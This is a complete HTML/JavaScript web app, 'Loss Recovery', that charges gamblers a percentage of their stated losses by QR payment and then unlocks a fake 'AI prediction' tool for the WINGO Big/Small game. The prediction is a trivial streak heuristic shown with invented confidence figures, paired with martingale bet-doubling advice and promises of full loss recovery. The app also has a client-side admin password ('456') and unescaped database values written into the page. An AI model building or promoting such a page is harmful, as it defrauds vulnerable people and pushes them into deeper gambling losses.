<!doctype html>
<html lang="hi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Loss Recovery - Final Fixed</title>
  <style>
    body{margin:0;font-family:Arial, sans-serif;background:#0f1720;color:#fff;text-align:center;background-size:cover;background-position:center;min-height:100vh}
    .container{padding:20px;max-width:980px;margin:0 auto}
    .page{display:none;padding:18px}
    .active{display:block}
    .btn{padding:8px 14px;margin:6px;border:none;border-radius:8px;cursor:pointer;background:#ff6b6b;color:#fff;font-weight:700}
    .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:#fff;padding:8px 12px}
    .plans{display:flex;flex-wrap:wrap;justify-content:center;gap:12px;margin-top:20px}
    .plan{background:rgba(255,255,255,0.03);padding:14px;border-radius:10px;cursor:pointer;min-width:160px;box-shadow:0 6px 18px rgba(0,0,0,0.6)}
    .selected{outline:3px solid rgba(255,107,107,0.6)}
    img.qr{width:200px;height:200px;margin-top:15px;object-fit:cover}
    /* Admin panel smaller & responsive */
    #adminPanel{display:none;background:rgba(0,0,0,0.9);padding:12px;text-align:left;border-radius:8px;position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);width:95%;max-width:650px;z-index:999;color:#eee;font-size:13px;overflow-y:auto;max-height:80vh}
    #adminPanel table{width:100%;border-collapse:collapse;font-size:12px}
    #adminPanel th,#adminPanel td{padding:6px;border:1px solid rgba(255,255,255,0.2);text-align:center}
    #adminRequests{overflow-x:auto;}
    #adminHotspot{position:fixed;bottom:4px;right:4px;width:28px;height:28px;cursor:pointer;opacity:0;z-index:50}
    input[type=text], input[type=number], textarea{padding:10px;border-radius:6px;border:none;outline:none;width:85%;max-width:540px;margin:8px 0;background:rgba(255,255,255,0.03);color:#fff}
    table{width:100%;border-collapse:collapse;margin-top:12px}
    th,td{padding:10px;border:1px solid rgba(255,255,255,0.06);font-size:14px;text-align:center}
    .small{font-size:13px;color:#cbd5e1}
    .hint{opacity:0.95;font-size:13px;color:#cbd5e1}
    .chip{display:inline-block;background:rgba(255,255,255,0.03);padding:6px 10px;border-radius:999px;margin:6px}
    .alert{background:#3b2b2b;padding:12px;border-radius:8px;margin:8px 0;color:#ffdcdc}
    .success{background:#12321a;padding:12px;border-radius:8px;margin:8px 0;color:#b7f5b7}
    .predictionBox{margin-top:12px;padding:12px;background:rgba(255,255,255,0.03);border-radius:8px}
    a.service{color:#7bdff6}
  </style>
</head>
<body id="body">
  <div class="container">
    <div id="welcome" class="page active">
      <h1>Welcome to Loss Recovery</h1>
      <p class="small">Start recovery journey</p>
      <button class="btn" onclick="goLoss()">Next</button>
    </div>

    <div id="loss" class="page">
      <h2>Enter your Loss Amount</h2>
      <input type="number" id="lossAmount" placeholder="Enter loss amount (₹)" />
      <div>
        <button class="btn" onclick="confirmLoss()">Confirm</button>
        <button class="btn secondary" onclick="showPage('welcome')">Back</button>
      </div>
    </div>

    <div id="plan" class="page">
      <h2>Choose a Plan</h2>
      <div class="plans" id="plans"></div>
      <div>
        <button class="btn" onclick="goPayment()">Proceed to Payment</button>
        <button class="btn secondary" onclick="showPage('loss')">Back</button>
      </div>
    </div>

    <div id="payment" class="page">
      <h2 id="planName"></h2>
      <p>Amount to Pay: ₹<span id="planPrice"></span></p>
      <img src="qr.png" class="qr" alt="QR Code"/>
      <p class="hint">Scan the QR code and make payment. Enter UTR below.</p>
      <input type="text" id="utr" placeholder="Enter UTR / Transaction ID" />
      <div>
        <button class="btn" onclick="submitUTR()">Confirm UTR</button>
        <button class="btn secondary" onclick="showPage('plan')">Back</button>
      </div>
      <p class="hint">If approval delayed > 5 min, contact customer service:</p>
      <p><a class="service" href="https://t.me/Nskskssiwi" target="_blank">t.me/Nskskssiwi</a></p>
    </div>

    <div id="strategy" class="page">
      <h2>Recovery Strategy</h2>
      <div id="strategyContent"></div>
      <div id="strategyButtons"></div>
      <p class="small">Note: Strategy is locked until admin approves your payment. Admin will approve using the admin panel.</p>
    </div>

    <div id="predict" class="page">
      <h2>AI Prediction (WINGO 1-min)</h2>
      <p class="small">Enter last 3-digit period number (e.g., 123) and last results sequence (Small/Big)</p>
      <input type="text" id="period" placeholder="Period (e.g., 123)" />
      <div class="hint">Example last 10: Small Big Small Big Big Big Small Big Small Big</div>
      <input type="text" id="last10" placeholder="Enter last results separated by space" />
      <div>
        <button class="btn" onclick="genPrediction()">Generate AI Prediction</button>
        <button class="btn secondary" onclick="autoFillExample()">Fill Example</button>
      </div>

      <div id="predictionResult" class="predictionBox"></div>

      <div style="margin-top:12px">
        <button class="btn" onclick="handleRecord('win')">Win</button>
        <button class="btn secondary" onclick="handleRecord('loss')">Loss</button>
        <button class="btn secondary" onclick="showPage('strategy')">Back</button>
      </div>

      <div style="margin-top:12px" class="hint">AI remembers feedback to improve suggestions.</div>
    </div>
  </div>

  <!-- Admin Panel (small/responsive) -->
  <div id="adminPanel">
    <h2>Admin Panel (Firebase)</h2>
    <div id="adminRequests" class="small">Loading requests...</div>
    <div style="text-align:right;margin-top:10px"><button class="btn" onclick="closeAdmin()">Close</button></div>
  </div>

  <div id="adminHotspot" onclick="openAdmin()"></div>

<script type="module">
// Firebase imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
import { getDatabase, ref, push, set, onValue, update } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBs7eQyMrcN8kJWMHl2ac2UZHlYQ6DypD8",
  authDomain: "terminal-xxrr.firebaseapp.com",
  databaseURL: "https://terminal-xxrr-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "terminal-xxrr",
  storageBucket: "terminal-xxrr.firebasestorage.app",
  messagingSenderId: "722753278120",
  appId: "1:722753278120:web:bfa37aab39635a4e57f29d",
  measurementId: "G-E3MZH3E1K5"
};
const app = initializeApp(firebaseConfig);
try{ getAnalytics(app); }catch(e){}
const db = getDatabase(app);

// Save UTR to Firebase
function saveUTRtoFirebase(utr, amount, deviceId, planDays, planLabel, loss){
  const utrRef = ref(db, 'utrRequests');
  const newRef = push(utrRef);
  set(newRef, {
    utr: utr,
    amount: amount,
    status: 'pending',
    deviceId: deviceId,
    planDays: planDays,
    planLabel: planLabel,
    loss: loss,
    time: Date.now()
  });
}

/* ---------- App Logic ---------- */
function showPage(id){ document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); const bg={'welcome':'anime1.png','loss':'anime2.png','plan':'anime3.png','payment':'anime4.png','strategy':'anime5.png','predict':'anime4.png'}; document.body.style.backgroundImage = "url('"+(bg[id]||'anime1.png')+"')"; }
function goLoss(){ showPage('loss'); }

let loss= parseFloat(localStorage.getItem('lossAmount') || '0');
let selectedPlan=null;
let planPrice=0;
let martingaleCurrent = parseInt(localStorage.getItem('martingaleCurrent')||'0',10);
let baseBet = parseInt(localStorage.getItem('baseBet')||'0',10) || 0;
let deviceId = localStorage.getItem('deviceId') || (Math.random().toString(36).slice(2));
localStorage.setItem('deviceId', deviceId);

// plan options
const plans = [
  {label:'3 Month',pct:7,days:90},
  {label:'1 Month',pct:12.5,days:30},
  {label:'1 Week',pct:15,days:7},
  {label:'3 Days',pct:20,days:3},
  {label:'1 Day',pct:25,days:1}
];

function buildPlans(){
  const box = document.getElementById('plans'); box.innerHTML='';
  plans.forEach(p=>{
    const price = Math.max(1, Math.round(loss * p.pct / 100));
    const div = document.createElement('div');
    div.className = 'plan';
    div.innerHTML = `<b>${p.label}</b><div class="small">Price: ₹${price}</div><div class="small">Duration: ${p.days} days</div>`;
    div.onclick = ()=>{
      document.querySelectorAll('.plan').forEach(x=>x.classList.remove('selected'));
      div.classList.add('selected');
      selectedPlan = p;
      planPrice = price;
      document.getElementById('planName').innerText = p.label || '';
      document.getElementById('planPrice').innerText = price;
    };
    box.appendChild(div);
  });
}

function confirmLoss(){
  const v = parseFloat(document.getElementById('lossAmount').value);
  if(!v || v <= 0){ alert("Enter valid amount"); return; }
  loss = v;
  localStorage.setItem('lossAmount', String(loss));
  // deposit = 10% of loss
  const deposit = Math.max(1, Math.round(loss * 0.10));
  localStorage.setItem('depositAmount', String(deposit));
  baseBet = Math.max(1, Math.round(loss * 0.05));
  martingaleCurrent = baseBet;
  localStorage.setItem('baseBet', String(baseBet));
  localStorage.setItem('martingaleCurrent', String(martingaleCurrent));
  buildPlans();
  localStorage.setItem('planStarted','true');
  showPage('plan');
}

function goPayment(){
  if(!selectedPlan){ alert("Select a plan"); return; }
  document.getElementById('planName').innerText = selectedPlan.label;
  document.getElementById('planPrice').innerText = planPrice;
  showPage('payment');
}

function submitUTR(){
  const utr = document.getElementById('utr').value.trim();
  if(!utr){ alert("Enter UTR"); return; }
  saveUTRtoFirebase(utr, planPrice, deviceId, selectedPlan.days, selectedPlan.label, loss);
  localStorage.setItem('utrSubmittedAt', String(Date.now()));
  alert('Payment submitted for approval. Admin will approve soon. If approval delayed > 5 min, contact support.');
  showPage('strategy');
  renderStrategyLocked();
}

/* ---------- Firebase listener (Admin + user check) ---------- */
const adminReqRef = ref(db, 'utrRequests');
onValue(adminReqRef, (snap) => {
  const el = document.getElementById('adminRequests');
  if(!snap.exists()){ el.innerHTML = '<div class="small">No pending requests</div>'; return; }
  const data = snap.val();
  // Build admin table - show only PENDING entries (requested)
  let html = '<div style="overflow-x:auto"><table><thead><tr><th>Key</th><th>UTR</th><th>Amt</th><th>DeviceId</th><th>Plan</th><th>Days</th><th>Status</th><th>Time</th><th>Action</th></tr></thead><tbody>';
  for(const k in data){
    const r = data[k];
    if(r.status !== 'pending') continue; // <- only pending shown
    html += `<tr>
      <td style="font-size:12px">${k}</td>
      <td>${r.utr || ''}</td>
      <td>₹${r.amount || ''}</td>
      <td style="font-size:12px">${r.deviceId || ''}</td>
      <td>${r.planLabel || ''}</td>
      <td>${r.planDays || ''}</td>
      <td>${r.status || ''}</td>
      <td style="font-size:12px">${new Date(r.time).toLocaleString()}</td>
      <td>
        <button class="btn" onclick="adminApprove('${k}')">Approve</button>
        <button class="btn" onclick="adminReject('${k}')">Reject</button>
      </td>
    </tr>`;
  }
  html += '</tbody></table></div>';
  el.innerHTML = html;

  // check if current device has a request and if status changed
  const myReqKey = findMyRequestKey(data);
  if(myReqKey) checkUserApproval({key: myReqKey, data: data[myReqKey]});
  else checkUserApproval(null);
});

function adminApprove(key){
  if(!confirm('Approve this request?')) return;
  const node = ref(db, 'utrRequests/' + key);
  update(node, { status: 'approved', approvedAt: Date.now() });
}
function adminReject(key){
  if(!confirm('Reject this request?')) return;
  const node = ref(db, 'utrRequests/' + key);
  update(node, { status: 'rejected', rejectedAt: Date.now() });
}

function findMyRequestKey(allData){
  if(!allData) return null;
  for(const k in allData){
    if(allData[k].deviceId === deviceId) return k;
  }
  return null;
}

function checkUserApproval(req){
  if(!req){
    renderStrategyLocked();
    return;
  }
  const data = req.data || req;
  if(data.status === 'approved'){
    localStorage.setItem('approvedRequestKey', req.key || '');
    localStorage.setItem('approved', 'true');
    if(data.loss) localStorage.setItem('lossAmount', String(data.loss));
    if(data.planDays) localStorage.setItem('planDays', String(data.planDays));
    if(data.planLabel) localStorage.setItem('planLabel', data.planLabel);
    generateAndStoreTargets();
    renderStrategyUnlocked();
    return;
  } else if(data.status === 'rejected'){
    renderStrategyRejected();
    return;
  } else {
    renderStrategyLocked();
  }
}

/* ---------- Targets generation ---------- */
function generateAndStoreTargets(){
  const l = parseFloat(localStorage.getItem('lossAmount') || '0');
  const days = parseInt(localStorage.getItem('planDays') || (selectedPlan ? selectedPlan.days : '0'), 10);
  if(!l || !days) return;
  // Progressive targets: day1 small, increase gradually so sum == loss
  let a = Math.max(1, Math.round(l * 0.03)); // start roughly 3% of loss
  let d = 0;
  if(days > 1) d = (2 * l / days - 2 * a) / (days - 1);
  else d = 0;
  let targets = [];
  let sum = 0;
  for(let i=0;i<days;i++){
    let t = Math.max(1, Math.round(a + i * d));
    targets.push(t);
    sum += t;
  }
  const diff = Math.round(l - sum);
  if(diff !== 0){
    targets[targets.length - 1] += diff;
  }
  localStorage.setItem('dayTargets', JSON.stringify(targets));
  const statusArr = Array.from({length: days}, (_,i) => 'Pending');
  localStorage.setItem('dayStatus', JSON.stringify(statusArr));
  localStorage.setItem('currentDay', '1');
  if(!localStorage.getItem('planDays') && selectedPlan) localStorage.setItem('planDays', String(selectedPlan.days));
  if(!localStorage.getItem('planLabel') && selectedPlan) localStorage.setItem('planLabel', selectedPlan.label);
}

/* ---------- Strategy renderers ---------- */
function renderStrategyLocked(){
  const el = document.getElementById('strategyContent');
  const deposit = parseInt(localStorage.getItem('depositAmount')||'0',10) || Math.max(1, Math.round((parseFloat(localStorage.getItem('lossAmount')||'0')||0) * 0.10));
  const utrTime = parseInt(localStorage.getItem('utrSubmittedAt')||'0',10);
  let waitingHtml = `<p class="small">Your payment is pending admin approval. Submit UTR on Payment page and wait for admin.</p>
                     <div class="hint">Deposit required now: <b>₹${deposit}</b> (10% of loss). After payment, enter UTR to request approval.</div>`;
  if(utrTime){
    const elapsed = Date.now() - utrTime;
    if(elapsed > (5 * 60 * 1000)){
      waitingHtml += `<div class="alert"><b>Approval delayed.</b> If admin hasn't approved within 5 minutes, contact Customer Service:</div>
                      <div><a class="service" href="https://t.me/Nskskssiwi" target="_blank">t.me/Nskskssiwi</a></div>`;
    } else {
      const mins = Math.ceil((5*60*1000 - elapsed)/60000);
      waitingHtml += `<div class="chip">Admin will review soon. If not approved in ~${mins} min, contact support: <a class="service" href="https://t.me/Nskskssiwi" target="_blank">t.me/Nskskssiwi</a></div>`;
    }
  } else {
    waitingHtml += `<div class="chip">If approval delayed >5 min, contact: <a class="service" href="https://t.me/Nskskssiwi" target="_blank">t.me/Nskskssiwi</a></div>`;
  }
  el.innerHTML = waitingHtml;
  document.getElementById('strategyButtons').innerHTML = `<div class="small" style="margin-top:12px">
    <button class="btn" onclick="showPage('payment')">Resubmit UTR / Pay</button>
  </div>`;
}
function renderStrategyRejected(){
  const el = document.getElementById('strategyContent');
  el.innerHTML = `<p style="color:#ffb4b4"><b>Payment rejected by admin. Contact support.</b></p><div><button class="btn" onclick="showPage('payment')">Resubmit UTR</button></div>`;
  document.getElementById('strategyButtons').innerHTML = '';
}
function renderStrategyUnlocked(){
  const el = document.getElementById('strategyContent');
  const targets = JSON.parse(localStorage.getItem('dayTargets')||'[]');
  const dayStatus = JSON.parse(localStorage.getItem('dayStatus')||'[]');
  const currentDay = parseInt(localStorage.getItem('currentDay')||'1',10);
  if(!targets.length){ el.innerHTML = '<p class="small">Targets not generated yet.</p>'; return; }
  let html = `<p class="small">Plan: ${localStorage.getItem('planLabel')||''} | Total Loss: ₹${localStorage.getItem('lossAmount')||''}</p>`;
  html += '<table><thead><tr><th>Day</th><th>Target (₹)</th><th>Status</th></tr></thead><tbody>';
  targets.forEach((t,i)=>{
    const idx = i+1;
    const st = (dayStatus[i] || 'Pending');
    const mark = (st === 'Completed' ? '✅ Completed' : (idx === currentDay ? '➡️ Current' : '⏳ Pending'));
    html += `<tr><td>${idx}</td><td>₹${t}</td><td>${mark}</td></tr>`;
  });
  html += '</tbody></table>';
  el.innerHTML = html;
  document.getElementById('strategyButtons').innerHTML = `<div style="margin-top:12px">
    <button class="btn" onclick="startTodayPrediction()">Start Today's Prediction (Day ${currentDay})</button>
    <button class="btn" onclick="resetPlanConfirm()">Cancel/Reset Plan</button>
  </div>`;
}

/* ---------- Start Prediction (fixed) ---------- */
/* Behavior: open prediction page; if user has >=3 last results -> auto-run analysis;
   else focus input and show message so user knows to enter last results */
function startTodayPrediction(){
  if(localStorage.getItem('approved') !== 'true'){ alert('Payment not yet approved. If delayed >5 min, contact support.'); return; }
  showPage('predict');
  // if last10 has >=3 entries, auto-run genPrediction; otherwise prompt user
  const last10Val = (document.getElementById('last10').value || '').trim();
  const seq = last10Val ? last10Val.split(/\s+/).filter(Boolean) : [];
  if(seq.length >= 3){
    // small delay to allow UI to render
    setTimeout(()=>{ genPrediction(); }, 600);
  } else {
    // focus last10 input and show hint
    document.getElementById('last10').focus();
    alert('Please enter last 3-10 results (e.g., "Small Big Small ...") so AI can analyse. You may also use Fill Example button.');
  }
}

/* ---------- Prediction logic (unchanged advanced algorithm) ---------- */
function parseSeq(text){
  if(!text) return [];
  const parts = text.trim().split(/\s+/).map(s=>{
    const a = s.toLowerCase();
    if(a.startsWith('b')) return 'Big';
    if(a.startsWith('s')) return 'Small';
    return null;
  }).filter(Boolean);
  return parts;
}
function computePatternPrediction(seq){
  const n = seq.length;
  if(n === 0) return {prediction:'Big', confidence:50, reason:'no-data'};
  const counts = {Big:0, Small:0};
  seq.forEach(x=>counts[x] = (counts[x]||0)+1);
  let last = seq[n-1];
  let streak = 1;
  for(let i=n-2;i>=0;i--){ if(seq[i]===last) streak++; else break; }
  let alternations = 0;
  for(let i=1;i<n;i++){ if(seq[i] !== seq[i-1]) alternations++; }
  const alternationRatio = alternations / Math.max(1, n-1);
  let score = {Big:0, Small:0};
  if(counts.Big > counts.Small) score.Big += 1;
  if(counts.Small > counts.Big) score.Small += 1;
  if(alternationRatio < 0.4) score[last] += 2;
  else if(alternationRatio > 0.6) score[last] += 1;
  if(streak >= 4){
    const other = last === 'Big' ? 'Small' : 'Big';
    score[other] += 3;
  } else if(streak >= 2){ score[last] += 1; }
  if(n >= 4){
    const last4 = seq.slice(-4).join(' ');
    if(/^(Big Small Big Small|Small Big Small Big)$/i.test(last4)){
      const next = last === 'Big' ? 'Small' : 'Big';
      score[next] += 2;
    }
    if(/^(Big Big Small|Small Small Big)$/i.test(last4)){
      const next = last === 'Big' ? 'Small' : 'Big';
      score[next] += 1;
    }
  }
  let prediction = 'Big';
  if(score.Small > score.Big) prediction = 'Small';
  else if(score.Big > score.Small) prediction = 'Big';
  else {
    if(streak >= 3) prediction = (last === 'Big' ? 'Small' : 'Big');
    else prediction = (counts.Big >= counts.Small ? 'Big' : 'Small');
  }
  let confidence = 50;
  const diff = Math.abs(score.Big - score.Small);
  confidence += Math.min(30, diff * 10);
  if(streak >= 4) confidence += 10;
  if(alternationRatio > 0.7) confidence += 5;
  confidence += Math.min(10, Math.abs(counts.Big - counts.Small) * 2);
  confidence = Math.max(50, Math.min(95, Math.round(confidence)));
  let reason = `counts: B${counts.Big}/S${counts.Small}, streak:${last}x${streak}, alt:${Math.round(alternationRatio*100)}%`;
  return {prediction, confidence, reason, score};
}

function genPrediction(){
  const last10Text = document.getElementById('last10').value.trim();
  const seq = parseSeq(last10Text);
  if(seq.length < 3){ alert('Please enter at least 3 recent results (ideally 10).'); return; }
  const period = document.getElementById('period').value.trim();
  const res = document.getElementById('predictionResult');
  res.innerHTML = `<p class="small">AI analyzing trends & patterns... (this may take ~8-12 seconds)</p>
                   <div class="chip">Period: ${period || 'N/A'}</div>`;
  setTimeout(()=>{
    const out = computePatternPrediction(seq);
    let suggestedBet = martingaleCurrent || baseBet;
    const cap = Math.max(1, Math.round(loss * 0.30));
    if(suggestedBet > cap) suggestedBet = cap;
    res.innerHTML = `<h3>Prediction: ${out.prediction}</h3>
                     <p class="small">Confidence: <b>${out.confidence}%</b></p>
                     <p class="small">Reason: ${out.reason}</p>
                     <p class="small">Suggested Bet: <b>₹${suggestedBet}</b></p>
                     <p class="small">Tip: Martingale will double bet after loss, reset to base after win.</p>`;
    const hist = JSON.parse(localStorage.getItem('predictionHistory')||'[]');
    hist.push({time:Date.now(), period:period||null, seq:seq.slice(-10), pred:out.prediction, conf:out.confidence});
    if(hist.length > 300) hist.shift();
    localStorage.setItem('predictionHistory', JSON.stringify(hist));
  }, 10000);
}

function handleRecord(outcome){
  const predDiv = document.getElementById('predictionResult');
  if(!predDiv.innerText || predDiv.innerText.trim()===''){ alert('Pehle AI prediction generate kijiye.'); return; }
  const actual = prompt('Enter actual result (Big or Small):');
  if(!actual){ alert('Actual result required'); return; }
  const actualNorm = actual.toLowerCase().startsWith('b') ? 'Big' : actual.toLowerCase().startsWith('s') ? 'Small' : null;
  if(!actualNorm){ alert('Invalid actual. Use Big or Small.'); return; }
  const recoveredStr = prompt('Enter profit/recovery amount you made this session (₹). If none, enter 0:','0');
  const recovered = Math.max(0, Math.round(parseFloat(recoveredStr) || 0));
  if(outcome === 'win'){
    martingaleCurrent = baseBet;
    localStorage.setItem('martingaleCurrent', String(martingaleCurrent));
    predDiv.innerHTML += `<p>✅ Win recorded. Martingale reset to ₹${martingaleCurrent}.</p>`;
  } else {
    martingaleCurrent = Math.min(Math.round((martingaleCurrent || baseBet) * 2), Math.max(1, Math.round(loss * 0.5)));
    localStorage.setItem('martingaleCurrent', String(martingaleCurrent));
    predDiv.innerHTML += `<p>❌ Loss recorded. Martingale increased to ₹${martingaleCurrent}.</p>`;
  }
  // update last10 input
  const field = document.getElementById('last10');
  const cur = parseSeq(field.value);
  cur.push(actualNorm);
  const newArr = cur.slice(-10);
  field.value = newArr.join(' ');
  predDiv.innerHTML += `<p class="small">History updated: ${newArr.join(' ')}</p>`;
  // update day progress
  const targets = JSON.parse(localStorage.getItem('dayTargets')||'[]');
  let dayStatus = JSON.parse(localStorage.getItem('dayStatus')||'[]');
  let currentDay = parseInt(localStorage.getItem('currentDay')||'1',10);
  if(!targets.length){ alert('Targets not configured.'); return; }
  const todayTarget = targets[currentDay - 1] || 0;
  if(recovered >= todayTarget){
    dayStatus[currentDay - 1] = 'Completed';
    localStorage.setItem('dayStatus', JSON.stringify(dayStatus));
    predDiv.innerHTML += `<p>🎉 Day ${currentDay} target ₹${todayTarget} achieved. Marked Completed.</p>`;
    const allCompleted = dayStatus.every(s => s === 'Completed');
    if(allCompleted){
      predDiv.innerHTML += `<p style="color:#b7f5b7"><b>🎊 Congratulations! Your full loss ₹${loss} recovered. Resetting...</b></p>`;
      setTimeout(() => { resetAll(); }, 3000);
      return;
    } else {
      const next = dayStatus.findIndex(s => s !== 'Completed');
      if(next >= 0){
        currentDay = next + 1;
        localStorage.setItem('currentDay', String(currentDay));
      }
    }
    setTimeout(()=>{ renderStrategyUnlocked(); showPage('strategy'); }, 1200);
  } else {
    predDiv.innerHTML += `<p style="color:#ffd6d6">⚠️ Recovered ₹${recovered} — less than today's target ₹${todayTarget}. Day remains pending.</p>`;
  }
  const hist = JSON.parse(localStorage.getItem('predictionHistory')||'[]');
  const lastEntry = hist.length ? hist[hist.length -1] : null;
  if(lastEntry){
    lastEntry.outcome = outcome;
    lastEntry.actual = actualNorm;
    lastEntry.recovered = recovered;
    lastEntry.martingaleAfter = martingaleCurrent;
    localStorage.setItem('predictionHistory', JSON.stringify(hist));
  }
}

/* ---------- Utilities ---------- */
function resetAll(){
  localStorage.removeItem('dayTargets');
  localStorage.removeItem('dayStatus');
  localStorage.removeItem('currentDay');
  localStorage.removeItem('approved');
  localStorage.removeItem('approvedRequestKey');
  localStorage.removeItem('planDays');
  localStorage.removeItem('planLabel');
  localStorage.removeItem('lossAmount');
  localStorage.removeItem('depositAmount');
  localStorage.removeItem('utrSubmittedAt');
  localStorage.removeItem('baseBet');
  localStorage.removeItem('martingaleCurrent');
  localStorage.removeItem('predictionHistory');
  localStorage.removeItem('planStarted');
  alert('Plan reset. Back to start.');
  showPage('welcome');
}
function resetPlanConfirm(){
  if(confirm('Are you sure you want to cancel/reset this plan? This will clear local progress.')) resetAll();
}
function openAdmin(){
  const pass = prompt('Enter Admin Password to open panel:');
  if(pass === '456'){
    document.getElementById('adminPanel').style.display = 'block';
  } else {
    alert('Wrong password');
  }
}
function closeAdmin(){
  document.getElementById('adminPanel').style.display = 'none';
}
function autoFillExample(){
  document.getElementById('period').value = 'yesterday-123';
  document.getElementById('last10').value = 'Small Big Small Big Big Big Small Big Small Big';
  alert('Example filled. Press Generate AI Prediction.');
}

/* ---------- Init ---------- */
(function init(){
  const storedLoss = parseFloat(localStorage.getItem('lossAmount')||'0');
  if(storedLoss) { loss = storedLoss; }
  if(localStorage.getItem('planStarted') === 'true'){
    if(localStorage.getItem('approved') === 'true' && localStorage.getItem('dayTargets')){
      renderStrategyUnlocked();
      showPage('strategy');
    } else {
      renderStrategyLocked();
      showPage('strategy');
    }
  } else {
    showPage('welcome');
  }
  if(loss) buildPlans();
})();

/* expose functions */
window.goLoss = goLoss;
window.confirmLoss = confirmLoss;
window.goPayment = goPayment;
window.submitUTR = submitUTR;
window.buildPlans = buildPlans;
window.genPrediction = genPrediction;
window.handleRecord = handleRecord;
window.showPage = showPage;
window.openAdmin = openAdmin;
window.closeAdmin = closeAdmin;
window.autoFillExample = autoFillExample;
window.resetPlanConfirm = resetPlanConfirm;
window.adminApprove = adminApprove;
window.adminReject = adminReject;

</script>
</body>
</html>
